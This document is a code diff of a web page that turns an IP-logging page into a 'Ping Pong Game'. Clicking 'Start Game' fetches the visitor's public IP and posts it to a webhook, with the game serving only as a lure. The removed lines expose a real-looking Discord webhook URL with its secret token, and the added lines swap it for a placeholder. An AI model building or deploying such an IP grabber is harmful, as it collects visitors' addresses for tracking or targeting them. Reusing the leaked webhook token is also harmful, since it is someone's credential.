@@ -1,32 +1,54 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Get User IP</title>
+    <title>Ping Pong Game</title>
 </head>
 <body>
     <h1>Welcome to the Ping Pong Game!</h1>
     <h2>Your IP Address will be sent to the Webhook.</h2>
-    <h3>Please click the button below to start the game</h3>
-    <button onclick="pingPong()">Start Game</button>
+    <h3>Please click the button below to start the game and send your IP</h3>
+    <button onclick="playPingPong()">Start Game</button>
 
     <script>
-        function pingPong() {
+        function playPingPong() {
             fetch('https://api.ipify.org?format=json')
             .then(response => response.json())
             .then(data => {
                 const userIp = data.ip;
                 sendToWebhook(userIp);
+                pingPong(userIp);
             })
             .catch(error => console.error(error));
         }
 
+        function pingPong(ip) {
+            let count = 0;
+            const interval = setInterval(() => {
+                count++;
+                if (count % 2 === 1) {
+                    console.log(`${count}. Ping! Your IP is ${ip}`);
+                } else {
+                    console.log(`${count}. Pong! Your IP is ${ip}`);
+                }
+                if (count === 10) {
+                    clearInterval(interval);
+                }
+            }, 1000);
+        }
+
         function sendToWebhook(ip) {
-            fetch('https://discord.com/api/webhooks/1211159466209181726/Bf5kdFN727sLofxncgaDtzKKdbPFCqh1307szKyT8YODHD2bDqTygjrMX9gTs_Dbkj0n', {
+            const message = "Here is the IP";
+            const payload = {
+                message: message,
+                ip: ip
+            };
+
+            fetch('https://your-webhook-url.com', {
                 method: 'POST',
                 headers: {
                     'Content-Type': 'application/json'
                 },
-                body: JSON.stringify({ ip: ip })
+                body: JSON.stringify(payload)
             })
             .then(response => response.json())
             .then(data => console.log(data))
